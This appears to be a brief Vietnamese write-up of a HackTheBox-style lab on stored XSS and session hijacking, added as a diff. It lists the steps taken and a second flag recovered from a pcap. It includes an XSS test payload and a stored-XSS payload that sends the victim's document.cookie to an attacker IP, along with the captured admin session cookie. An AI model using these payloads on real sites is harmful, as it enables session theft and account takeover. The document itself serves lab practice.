@@ -1,0 +1,41 @@
+// cho credential
+
+
+// endpoint cho phep bot admin truy cap vao url do minh chi dan
+http://minilab.htb.net/submit-solution?url=
+
+=> login voi credential
+
+=> phat hien mot trang chinh sua thong tin 
+
+=> thu payload xss voi form sua thong tin, tuy nhien ko co hien tuong j
+	"><img src=x onerror=alert(1)>
+
+=> sang endpoint hien thi trang ca nhan (Phat hien dinh xss)
+
+=> dung xss de danh cap coookie
+
+<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://10.10.15.221:8000/?c=' + document.cookie;"></video>
+
+=> cho con bot truy cap vao trang ca nhan nhiem xss stored
+
+http://minilab.htb.net/submit-solution?url=http://minilab.htb.net/profile?email=julie.rogers@example.com
+=> luc nay ta se phat hien thu duoc cookie cua admin
+[Sun Jul 27 13:32:58 2025] 10.129.62.18:55588 [404]: GET /?c=auth-session=s%3As90cBJcIQjmhl2tg0rmLypWrIIA85yp5.4zo86MSBDTivakrLrKOutrzJOoK5xjKKZsttgIwp1Y8 - No such file or directory     
+
+=> thay doi cookie de hijacking session   
+
+=> bam hien thi ro chi tiet thong tin cua admin
+
+thu duoc => Flag	[YOU_ARE_A_SESSION_WARRIOR]    
+
+
+=> tai xuong file pcap
+
+=> mo voi wireshark
+=> an loc cac goi tin cua giao thuc http
+
+=> phat hien 1 goi dang nghi
+GET /?redirect_uri=/complete.html&token=FLAG{SUCCESS_YOU_PWN3D_US_H0PE_YOU_ENJ0YED} HTTP/1.1\r\n
+
+=> thu duoc flag
